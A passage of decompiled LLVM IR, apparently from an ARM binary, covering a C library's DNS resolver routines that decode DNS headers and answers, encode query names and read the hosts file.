  store i8 %v3_16b04, i8* %v4_16b08, align 1
  %v0_16b0c = load i32, i32* %lr.global-to-local, align 4
  %v1_16b0c = add i32 %v0_16b0c, 40
  %v2_16b0c = inttoptr i32 %v1_16b0c to i32*
  %v3_16b0c = load i32, i32* %v2_16b0c, align 4
  %v1_16b10 = trunc i32 %v3_16b0c to i8
  %v2_16b10 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b10 = add i32 %v2_16b10, 9
  %v4_16b10 = inttoptr i32 %v3_16b10 to i8*
  store i8 %v1_16b10, i8* %v4_16b10, align 1
  %v0_16b14 = load i32, i32* %lr.global-to-local, align 4
  %v1_16b14 = add i32 %v0_16b14, 45
  %v2_16b14 = inttoptr i32 %v1_16b14 to i8*
  %v3_16b14 = load i8, i8* %v2_16b14, align 1
  %v2_16b18 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b18 = add i32 %v2_16b18, 10
  %v4_16b18 = inttoptr i32 %v3_16b18 to i8*
  store i8 %v3_16b14, i8* %v4_16b18, align 1
  %v0_16b1c = load i32, i32* %lr.global-to-local, align 4
  %v1_16b1c = add i32 %v0_16b1c, 44
  %v2_16b1c = inttoptr i32 %v1_16b1c to i32*
  %v3_16b1c = load i32, i32* %v2_16b1c, align 4
  %v1_16b20 = trunc i32 %v3_16b1c to i8
  %v2_16b20 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b20 = add i32 %v2_16b20, 11
  %v4_16b20 = inttoptr i32 %v3_16b20 to i8*
  store i8 %v1_16b20, i8* %v4_16b20, align 1
  %v2_16b2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16b28

dec_label_pc_16b28:                               ; preds = %entry, %bb26
  %v2_16b2c = phi i32 [ %v3_16a4c, %entry ], [ %v2_16b2c.pre, %bb26 ]
  %v0_16b28 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_16b2c, i32* @r4, align 4
  ret i32 %v0_16b28

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0 }
  uselistorder i32 33, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16b28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_16b30 = load i8, i8* %arg1, align 1
  %v4_16b30 = zext i8 %v3_16b30 to i32
  %v2_16b34 = add i32 %tmp, 1
  %v3_16b34 = inttoptr i32 %v2_16b34 to i8*
  %v4_16b34 = load i8, i8* %v3_16b34, align 1
  %v5_16b34 = zext i8 %v4_16b34 to i32
  %v4_16b38 = mul nuw nsw i32 %v4_16b30, 256
  %v5_16b38 = or i32 %v5_16b34, %v4_16b38
  %v2_16b3c = inttoptr i32 %arg2 to i32*
  store i32 %v5_16b38, i32* %v2_16b3c, align 4
  %v2_16b40 = add i32 %tmp, 2
  %v3_16b40 = inttoptr i32 %v2_16b40 to i8*
  %v4_16b40 = load i8, i8* %v3_16b40, align 1
  %tmp4 = icmp slt i8 %v4_16b40, 0
  %v3_16b44 = zext i1 %tmp4 to i32
  %v2_16b48 = add i32 %arg2, 4
  %v3_16b48 = inttoptr i32 %v2_16b48 to i32*
  store i32 %v3_16b44, i32* %v3_16b48, align 4
  %v4_16b4c = load i8, i8* %v3_16b40, align 1
  %div = udiv i8 %v4_16b4c, 8
  %tmp5 = urem i8 %div, 16
  %v1_16b54 = zext i8 %tmp5 to i32
  %v2_16b58 = add i32 %arg2, 8
  %v3_16b58 = inttoptr i32 %v2_16b58 to i32*
  store i32 %v1_16b54, i32* %v3_16b58, align 4
  %v4_16b5c = load i8, i8* %v3_16b40, align 1
  %div1 = udiv i8 %v4_16b5c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_16b64 = zext i8 %tmp6 to i32
  %v2_16b68 = add i32 %arg2, 12
  %v3_16b68 = inttoptr i32 %v2_16b68 to i32*
  store i32 %v1_16b64, i32* %v3_16b68, align 4
  %v4_16b6c = load i8, i8* %v3_16b40, align 1
  %div2 = udiv i8 %v4_16b6c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_16b74 = zext i8 %tmp7 to i32
  %v2_16b78 = add i32 %arg2, 16
  %v3_16b78 = inttoptr i32 %v2_16b78 to i32*
  store i32 %v1_16b74, i32* %v3_16b78, align 4
  %v4_16b7c = load i8, i8* %v3_16b40, align 1
  %tmp8 = urem i8 %v4_16b7c, 2
  %v1_16b80 = zext i8 %tmp8 to i32
  %v2_16b84 = add i32 %arg2, 20
  %v3_16b84 = inttoptr i32 %v2_16b84 to i32*
  store i32 %v1_16b80, i32* %v3_16b84, align 4
  %v2_16b88 = add i32 %tmp, 3
  %v3_16b88 = inttoptr i32 %v2_16b88 to i8*
  %v4_16b88 = load i8, i8* %v3_16b88, align 1
  %tmp9 = icmp slt i8 %v4_16b88, 0
  %v3_16b8c = zext i1 %tmp9 to i32
  %v2_16b90 = add i32 %arg2, 24
  %v3_16b90 = inttoptr i32 %v2_16b90 to i32*
  store i32 %v3_16b8c, i32* %v3_16b90, align 4
  %v4_16b94 = load i8, i8* %v3_16b88, align 1
  %tmp10 = urem i8 %v4_16b94, 16
  %v1_16b98 = zext i8 %tmp10 to i32
  %v2_16b9c = add i32 %arg2, 28
  %v3_16b9c = inttoptr i32 %v2_16b9c to i32*
  store i32 %v1_16b98, i32* %v3_16b9c, align 4
  %v2_16ba0 = add i32 %tmp, 4
  %v3_16ba0 = inttoptr i32 %v2_16ba0 to i8*
  %v4_16ba0 = load i8, i8* %v3_16ba0, align 1
  %v5_16ba0 = zext i8 %v4_16ba0 to i32
  %v2_16ba4 = add i32 %tmp, 5
  %v3_16ba4 = inttoptr i32 %v2_16ba4 to i8*
  %v4_16ba4 = load i8, i8* %v3_16ba4, align 1
  %v5_16ba4 = zext i8 %v4_16ba4 to i32
  %v4_16ba8 = mul nuw nsw i32 %v5_16ba0, 256
  %v5_16ba8 = or i32 %v5_16ba4, %v4_16ba8
  %v2_16bac = add i32 %arg2, 32
  %v3_16bac = inttoptr i32 %v2_16bac to i32*
  store i32 %v5_16ba8, i32* %v3_16bac, align 4
  %v2_16bb0 = add i32 %tmp, 6
  %v3_16bb0 = inttoptr i32 %v2_16bb0 to i8*
  %v4_16bb0 = load i8, i8* %v3_16bb0, align 1
  %v5_16bb0 = zext i8 %v4_16bb0 to i32
  %v2_16bb4 = add i32 %tmp, 7
  %v3_16bb4 = inttoptr i32 %v2_16bb4 to i8*
  %v4_16bb4 = load i8, i8* %v3_16bb4, align 1
  %v5_16bb4 = zext i8 %v4_16bb4 to i32
  %v4_16bb8 = mul nuw nsw i32 %v5_16bb0, 256
  %v5_16bb8 = or i32 %v5_16bb4, %v4_16bb8
  %v2_16bbc = add i32 %arg2, 36
  %v3_16bbc = inttoptr i32 %v2_16bbc to i32*
  store i32 %v5_16bb8, i32* %v3_16bbc, align 4
  %v2_16bc0 = add i32 %tmp, 8
  %v3_16bc0 = inttoptr i32 %v2_16bc0 to i8*
  %v4_16bc0 = load i8, i8* %v3_16bc0, align 1
  %v5_16bc0 = zext i8 %v4_16bc0 to i32
  %v2_16bc4 = add i32 %tmp, 9
  %v3_16bc4 = inttoptr i32 %v2_16bc4 to i8*
  %v4_16bc4 = load i8, i8* %v3_16bc4, align 1
  %v5_16bc4 = zext i8 %v4_16bc4 to i32
  %v4_16bc8 = mul nuw nsw i32 %v5_16bc0, 256
  %v5_16bc8 = or i32 %v5_16bc4, %v4_16bc8
  %v2_16bcc = add i32 %arg2, 40
  %v3_16bcc = inttoptr i32 %v2_16bcc to i32*
  store i32 %v5_16bc8, i32* %v3_16bcc, align 4
  %v2_16bd0 = add i32 %tmp, 11
  %v3_16bd0 = inttoptr i32 %v2_16bd0 to i8*
  %v4_16bd0 = load i8, i8* %v3_16bd0, align 1
  %v5_16bd0 = zext i8 %v4_16bd0 to i32
  %v2_16bd4 = add i32 %tmp, 10
  %v3_16bd4 = inttoptr i32 %v2_16bd4 to i8*
  %v4_16bd4 = load i8, i8* %v3_16bd4, align 1
  %v5_16bd4 = zext i8 %v4_16bd4 to i32
  %v4_16bdc = mul nuw nsw i32 %v5_16bd4, 256
  %v5_16bdc = or i32 %v4_16bdc, %v5_16bd0
  %v2_16be0 = add i32 %arg2, 44
  %v3_16be0 = inttoptr i32 %v2_16be0 to i32*
  store i32 %v5_16bdc, i32* %v3_16be0, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 16, 4, 5, 17, 18, 19, 20, 21, 0, 12, 13, 7, 14, 15, 8, 3, 2, 1, 24 }
  uselistorder i32 40, { 10, 11, 4, 13, 1, 12, 2, 0, 5, 6, 7, 8, 9, 3 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 23, 40, 37, 39, 8, 38, 1, 24, 18, 2, 34, 35, 25, 26, 27, 28, 29, 30, 0, 31, 17, 36, 19, 20, 21, 3, 4, 22, 13, 12, 10, 11, 14, 15, 9, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 16, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16be8 = load i32, i32* @r4, align 4
  store i32 %v3_16be8, i32* %stack_var_-16, align 4
  %v6_16be8 = load i32, i32* @r5, align 4
  %v9_16be8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16bf0 = load i32, i32* %arg1, align 4
  store i32 %v2_16bf0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_16bfc = inttoptr i32 %v2_16bf0 to i8*
  %v2_16bfc = call i32 @__encode_dotted(i8* %v1_16bfc)
  store i32 %v2_16bfc, i32* %r0.global-to-local, align 4
  %v1_16c00 = icmp slt i32 %v2_16bfc, 0
  br i1 %v1_16c00, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_16c08 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_16c08, i32* @r4, align 4
  store i32 %v6_16be8, i32* @r5, align 4
  store i32 %v9_16be8, i32* @r6, align 4
  ret i32 %v2_16bfc

bb6:                                              ; preds = %entry
  %v1_16c04 = load i32, i32* @r4, align 4
  %v2_16c04 = sub i32 %v1_16c04, %v2_16bfc
  %v0_16c10 = load i32, i32* @r6, align 4
  %v2_16c10 = add i32 %v0_16c10, %v2_16bfc
  store i32 %v2_16c10, i32* %r2.global-to-local, align 4
  %v7_16c14 = icmp sgt i32 %v2_16c04, 3
  br i1 %v7_16c14, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_16c18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_16c18, i32* @r4, align 4
  store i32 %v6_16be8, i32* @r5, align 4
  store i32 %v9_16be8, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_16c1c = load i32, i32* @r5, align 4
  %v1_16c1c = add i32 %v0_16c1c, 5
  %v2_16c1c = inttoptr i32 %v1_16c1c to i8*
  %v3_16c1c = load i8, i8* %v2_16c1c, align 1
  %v5_16c20 = inttoptr i32 %v2_16c10 to i8*
  store i8 %v3_16c1c, i8* %v5_16c20, align 1
  %v0_16c24 = load i32, i32* @r5, align 4
  %v1_16c24 = add i32 %v0_16c24, 4
  %v2_16c24 = inttoptr i32 %v1_16c24 to i32*
  %v3_16c24 = load i32, i32* %v2_16c24, align 4
  %v1_16c28 = trunc i32 %v3_16c24 to i8
  %v2_16c28 = load i32, i32* %r2.global-to-local, align 4
  %v3_16c28 = add i32 %v2_16c28, 1
  %v4_16c28 = inttoptr i32 %v3_16c28 to i8*
  store i8 %v1_16c28, i8* %v4_16c28, align 1
  %v0_16c2c = load i32, i32* @r5, align 4
  %v1_16c2c = add i32 %v0_16c2c, 9
  %v2_16c2c = inttoptr i32 %v1_16c2c to i8*
  %v3_16c2c = load i8, i8* %v2_16c2c, align 1
  %v2_16c30 = load i32, i32* %r2.global-to-local, align 4
  %v3_16c30 = add i32 %v2_16c30, 2
  %v4_16c30 = inttoptr i32 %v3_16c30 to i8*
  store i8 %v3_16c2c, i8* %v4_16c30, align 1
  %v0_16c34 = load i32, i32* @r5, align 4
  %v1_16c34 = add i32 %v0_16c34, 8
  %v2_16c34 = inttoptr i32 %v1_16c34 to i32*
  %v3_16c34 = load i32, i32* %v2_16c34, align 4
  %v0_16c38 = load i32, i32* %r0.global-to-local, align 4
  %v1_16c38 = add i32 %v0_16c38, 4
  store i32 %v1_16c38, i32* %r0.global-to-local, align 4
  %v1_16c3c = trunc i32 %v3_16c34 to i8
  %v2_16c3c = load i32, i32* %r2.global-to-local, align 4
  %v3_16c3c = add i32 %v2_16c3c, 3
  %v4_16c3c = inttoptr i32 %v3_16c3c to i8*
  store i8 %v1_16c3c, i8* %v4_16c3c, align 1
  %v2_16c40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16c40, i32* @r4, align 4
  store i32 %v6_16be8, i32* @r5, align 4
  store i32 %v9_16be8, i32* @r6, align 4
  ret i32 %v1_16c38

; uselistorder directives
  uselistorder i32 %v2_16bfc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_16be8, { 1, 0, 2 }
  uselistorder i32 %v6_16be8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_16c48 = call i32 @__length_dotted()
  %v1_16c4c = icmp slt i32 %v0_16c48, 0
  br i1 %v1_16c4c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_16c50 = add i32 %v0_16c48, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_16c54 = phi i32 [ %v0_16c48, %entry ], [ %v4_16c50, %bb ]
  ret i32 %v5_16c54

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_16c58 = load i32, i32* @r4, align 4
  %v6_16c58 = load i32, i32* @r5, align 4
  %v9_16c58 = load i32, i32* @r6, align 4
  %v12_16c58 = load i32, i32* @r7, align 4
  %v21_16c58 = load i32, i32* @sl, align 4
  %v2_16c5c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_16c5c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_16c78 = call i32 @__decode_dotted()
  store i32 %v0_16c78, i32* %r0.global-to-local, align 4
  store i32 %v0_16c78, i32* @r7, align 4
  %v1_16c7c = icmp slt i32 %v0_16c78, 0
  %v0_16c80 = load i32, i32* @r4, align 4
  %v2_16c80 = add i32 %v0_16c80, %v0_16c78
  store i32 %v2_16c80, i32* %r8.global-to-local, align 4
  br i1 %v1_16c7c, label %bb14, label %dec_label_pc_16c90

dec_label_pc_16c90:                               ; preds = %entry
  %v1_16c88 = load i32, i32* @r5, align 4
  %v2_16c88 = sub i32 %v1_16c88, %v2_16c80
  %v1_16c90 = add i32 %v2_16c88, -10
  store i32 %v1_16c90, i32* @r5, align 4
  %v6_16c90 = icmp slt i32 %v1_16c90, 0
  store i32 %v2_16c5c, i32* %r0.global-to-local, align 4
  %v0_16c98 = load i32, i32* @sl, align 4
  %v2_16c98 = add i32 %v0_16c98, %v2_16c80
  store i32 %v2_16c98, i32* @r4, align 4
  br i1 %v6_16c90, label %bb, label %dec_label_pc_16ca4

bb:                                               ; preds = %dec_label_pc_16c90
  br label %bb14

dec_label_pc_16ca4:                               ; preds = %dec_label_pc_16c90
  %v1_16ca4 = bitcast i32* %stack_var_-288 to i8*
  %v2_16ca4 = call i32 @__GI_strdup(i8* %v1_16ca4)
  store i32 %v2_16ca4, i32* %r0.global-to-local, align 4
  %v1_16ca8 = load i32, i32* @r6, align 4
  %v2_16ca8 = inttoptr i32 %v1_16ca8 to i32*
  store i32 %v2_16ca4, i32* %v2_16ca8, align 4
  %v0_16cac = load i32, i32* @sl, align 4
  %v1_16cac = load i32, i32* %r8.global-to-local, align 4
  %v2_16cac = add i32 %v1_16cac, %v0_16cac
  %v3_16cac = inttoptr i32 %v2_16cac to i8*
  %v4_16cac = load i8, i8* %v3_16cac, align 1
  %v6_16cac = zext i8 %v4_16cac to i32
  %v0_16cb0 = load i32, i32* @r4, align 4
  %v1_16cb0 = add i32 %v0_16cb0, 1
  %v2_16cb0 = inttoptr i32 %v1_16cb0 to i8*
  %v3_16cb0 = load i8, i8* %v2_16cb0, align 1
  %v4_16cb0 = zext i8 %v3_16cb0 to i32
  %v4_16cb4 = mul nuw nsw i32 %v6_16cac, 256
  %v5_16cb4 = or i32 %v4_16cb0, %v4_16cb4
  store i32 %v5_16cb4, i32* %r3.global-to-local, align 4
  %v1_16cb8 = load i32, i32* @r6, align 4
  %v2_16cb8 = add i32 %v1_16cb8, 4
  %v3_16cb8 = inttoptr i32 %v2_16cb8 to i32*
  store i32 %v5_16cb4, i32* %v3_16cb8, align 4
  %v0_16cbc = load i32, i32* @r4, align 4
  %v1_16cbc = add i32 %v0_16cbc, 2
  store i32 %v1_16cbc, i32* %r1.global-to-local, align 4
  %v2_16cc0 = inttoptr i32 %v1_16cbc to i8*
  %v3_16cc0 = load i8, i8* %v2_16cc0, align 1
  %v4_16cc0 = zext i8 %v3_16cc0 to i32
  %v1_16cc4 = add i32 %v0_16cbc, 3
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i8*
  %v3_16cc4 = load i8, i8* %v2_16cc4, align 1
  %v4_16cc4 = zext i8 %v3_16cc4 to i32
  %v4_16cc8 = mul nuw nsw i32 %v4_16cc0, 256
  %v5_16cc8 = or i32 %v4_16cc4, %v4_16cc8
  store i32 %v5_16cc8, i32* %r3.global-to-local, align 4
  %v1_16ccc = load i32, i32* @r6, align 4
  %v2_16ccc = add i32 %v1_16ccc, 8
  %v3_16ccc = inttoptr i32 %v2_16ccc to i32*
  store i32 %v5_16cc8, i32* %v3_16ccc, align 4
  %v0_16cd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cd0 = add i32 %v0_16cd0, 2
  %v1_16cd4 = add i32 %v0_16cd0, 3
  %v2_16cd4 = inttoptr i32 %v1_16cd4 to i8*
  %v3_16cd4 = load i8, i8* %v2_16cd4, align 1
  %v4_16cd4 = zext i8 %v3_16cd4 to i32
  store i32 %v4_16cd4, i32* %r3.global-to-local, align 4
  %v2_16cd8 = inttoptr i32 %v1_16cd0 to i8*
  %v3_16cd8 = load i8, i8* %v2_16cd8, align 1
  %v4_16cd8 = zext i8 %v3_16cd8 to i32
  store i32 %v4_16cd8, i32* %r0.global-to-local, align 4
  %v1_16cdc = add i32 %v0_16cd0, 5
  %v2_16cdc = inttoptr i32 %v1_16cdc to i8*
  %v3_16cdc = load i8, i8* %v2_16cdc, align 1
  %v4_16cdc = zext i8 %v3_16cdc to i32
  store i32 %v4_16cdc, i32* @ip, align 4
  %v3_16ce0 = mul nuw nsw i32 %v4_16cd4, 65536
  store i32 %v3_16ce0, i32* %r3.global-to-local, align 4
  %v1_16ce4 = add i32 %v0_16cd0, 4
  %v2_16ce4 = inttoptr i32 %v1_16ce4 to i8*
  %v3_16ce4 = load i8, i8* %v2_16ce4, align 1
  %v4_16ce4 = zext i8 %v3_16ce4 to i32
  %v4_16ce8 = mul nuw i32 %v4_16cd8, 16777216
  %v5_16ce8 = or i32 %v4_16ce8, %v3_16ce0
  %v2_16cec = or i32 %v5_16ce8, %v4_16cdc
  %v4_16cf0 = mul nuw nsw i32 %v4_16ce4, 256
  %v5_16cf0 = or i32 %v2_16cec, %v4_16cf0
  store i32 %v5_16cf0, i32* %r3.global-to-local, align 4
  %v1_16cf4 = load i32, i32* @r6, align 4
  %v2_16cf4 = add i32 %v1_16cf4, 12
  %v3_16cf4 = inttoptr i32 %v2_16cf4 to i32*
  store i32 %v5_16cf0, i32* %v3_16cf4, align 4
  %v0_16cf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cf8 = add i32 %v0_16cf8, 6
  %v2_16cf8 = inttoptr i32 %v1_16cf8 to i8*
  %v3_16cf8 = load i8, i8* %v2_16cf8, align 1
  %v4_16cf8 = zext i8 %v3_16cf8 to i32
  %v0_16cfc = load i32, i32* @r4, align 4
  %v1_16cfc = add i32 %v0_16cfc, 9
  %v2_16cfc = inttoptr i32 %v1_16cfc to i8*
  %v3_16cfc = load i8, i8* %v2_16cfc, align 1
  %v4_16cfc = zext i8 %v3_16cfc to i32
  %v1_16d00 = add i32 %v0_16cfc, 10
  store i32 %v1_16d00, i32* %r0.global-to-local, align 4
  %v4_16d04 = mul nuw nsw i32 %v4_16cf8, 256
  %v5_16d04 = or i32 %v4_16cfc, %v4_16d04
  store i32 %v5_16d04, i32* %r3.global-to-local, align 4
  %v0_16d08 = load i32, i32* %r8.global-to-local, align 4
  %v1_16d08 = add i32 %v0_16d08, 10
  %v0_16d0c = load i32, i32* @r5, align 4
  %v1_16d10 = add nuw nsw i32 %v5_16d04, 10
  store i32 %v1_16d10, i32* %r1.global-to-local, align 4
  %v1_16d14 = load i32, i32* @r6, align 4
  %v2_16d14 = add i32 %v1_16d14, 24
  %v3_16d14 = inttoptr i32 %v2_16d14 to i32*
  store i32 %v1_16d08, i32* %v3_16d14, align 4
  %v0_16d18 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d18 = load i32, i32* @r6, align 4
  %v2_16d18 = add i32 %v1_16d18, 20
  %v3_16d18 = inttoptr i32 %v2_16d18 to i32*
  store i32 %v0_16d18, i32* %v3_16d18, align 4
  %v0_16d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_16d1c = load i32, i32* @r6, align 4
  %v2_16d1c = add i32 %v1_16d1c, 16
  %v3_16d1c = inttoptr i32 %v2_16d1c to i32*
  store i32 %v0_16d1c, i32* %v3_16d1c, align 4
  %v0_16d20 = load i32, i32* @r7, align 4
  %v1_16d20 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d20 = add i32 %v1_16d20, %v0_16d20
  %v5_16d24 = icmp slt i32 %v0_16d0c, %v5_16d04
  %.v2_16d20 = select i1 %v5_16d24, i32 -1, i32 %v2_16d20
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_16ca4, %entry
  %v0_16d28 = phi i32 [ %.v2_16d20, %dec_label_pc_16ca4 ], [ %v1_16c90, %bb ], [ %v0_16c78, %entry ]
  store i32 %v0_16d28, i32* %r0.global-to-local, align 4
  store i32 %v3_16c58, i32* @r4, align 4
  store i32 %v6_16c58, i32* @r5, align 4
  store i32 %v9_16c58, i32* @r6, align 4
  store i32 %v12_16c58, i32* @r7, align 4
  store i32 %v21_16c58, i32* @sl, align 4
  ret i32 %v0_16d28

; uselistorder directives
  uselistorder i32 %v0_16d28, { 1, 0 }
  uselistorder i32 %v5_16d04, { 1, 0, 2 }
  uselistorder i32 %v3_16ce0, { 1, 0 }
  uselistorder i32 %v1_16c90, { 0, 2, 1 }
  uselistorder i32 %v0_16c78, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 28, 29, 30, 31, 0, 20, 34, 3, 35, 1, 4, 32, 5, 21, 22, 11, 27, 12, 6, 2, 7, 23, 24, 25, 26, 13, 33, 14, 15, 16, 17, 18, 19, 8, 9, 10 }
  uselistorder i32 24, { 26, 27, 28, 18, 35, 0, 29, 30, 31, 19, 10, 36, 11, 1, 32, 20, 21, 22, 23, 24, 25, 12, 33, 34, 13, 14, 15, 16, 17, 7, 8, 4, 3, 9, 2, 5, 6, 37 }
  uselistorder i32 9, { 13, 14, 15, 16, 17, 3, 18, 4, 7, 21, 5, 8, 9, 10, 11, 12, 6, 2, 1, 0, 19, 20 }
  uselistorder i32 6, { 20, 21, 22, 13, 14, 17, 18, 1, 2, 24, 3, 4, 19, 0, 5, 6, 7, 8, 9, 15, 16, 10, 12, 11, 23 }
  uselistorder i32 5, { 1, 20, 21, 22, 11, 6, 2, 12, 13, 7, 14, 3, 5, 0, 18, 19, 15, 16, 17, 8, 10, 9, 4, 23, 24 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1a2b0.608 to i32), i32* @r1, align 4
  %v0_16d38 = load i32, i32* @lr, align 4
  store i32 %v0_16d38, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a314.642 to i32), i32* @r0, align 4
  %v3_16d40 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1a314.642 to i32), i32 ptrtoint (i32* @global_var_1a2b0.608 to i32))
  %v2_16d44 = icmp eq i32 %v3_16d40, 0
  store i32 ptrtoint (i32* @global_var_1a2b0.608 to i32), i32* @r1, align 4
  br i1 %v2_16d44, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_16d40

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1a320.644 to i32), i32* @r0, align 4
  %v2_16d54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16d54, i32* @lr, align 4
  %v3_16d58 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1a320.644 to i32), i32 ptrtoint (i32* @global_var_1a2b0.608 to i32))
  ret i32 %v3_16d58

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1a2b0.608 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_16d68 = load i32, i32* @r4, align 4
  %v6_16d68 = load i32, i32* @r5, align 4
  %v12_16d68 = load i32, i32* @r7, align 4
  %v15_16d68 = load i32, i32* @r8, align 4
  %v21_16d68 = load i32, i32* @sl, align 4
  %v24_16d68 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_16d74 = sub i32 0, %tmp61
  %v1_16d78 = urem i32 %v1_16d74, 4
  store i32 %v1_16d78, i32* @ip, align 4
  %v2_16d78 = icmp eq i32 %v1_16d78, 0
  %v0_16d7c = load i32, i32* @r2, align 4
  %v0_16d80 = load i32, i32* @r0, align 4
  %v0_16d84 = load i32, i32* @r1, align 4
  %v0_16d88 = load i32, i32* @r3, align 4
  store i32 %v0_16d88, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_16d78, label %dec_label_pc_16da8, label %dec_label_pc_16d98

dec_label_pc_16d98:                               ; preds = %entry
  %v2_16d98 = sub i32 %tmp57, %v1_16d78
  %v3_16d98 = icmp ult i32 %tmp57, %v1_16d78
  br i1 %v3_16d98, label %dec_label_pc_1707c, label %dec_label_pc_16da0

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d98
  store i32 %v2_16d98, i32* %r2.global-to-local, align 4
  %v2_16da4 = add i32 %v1_16d78, %tmp61
  store i32 %v2_16da4, i32* @r4, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %entry, %dec_label_pc_16da0
  %v0_16db8 = phi i32 [ %tmp61, %entry ], [ %v2_16da4, %dec_label_pc_16da0 ]
  %v0_16dbc = phi i32 [ %tmp57, %entry ], [ %v2_16d98, %dec_label_pc_16da0 ]
  %tmp = icmp ult i32 %v0_16dbc, 32
  br i1 %tmp, label %dec_label_pc_1707c, label %dec_label_pc_16db0

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16da8
  store i32 %v0_16d88, i32* %r0.global-to-local, align 4
  %v7_16db4 = icmp eq i32 %v0_16d88, 1
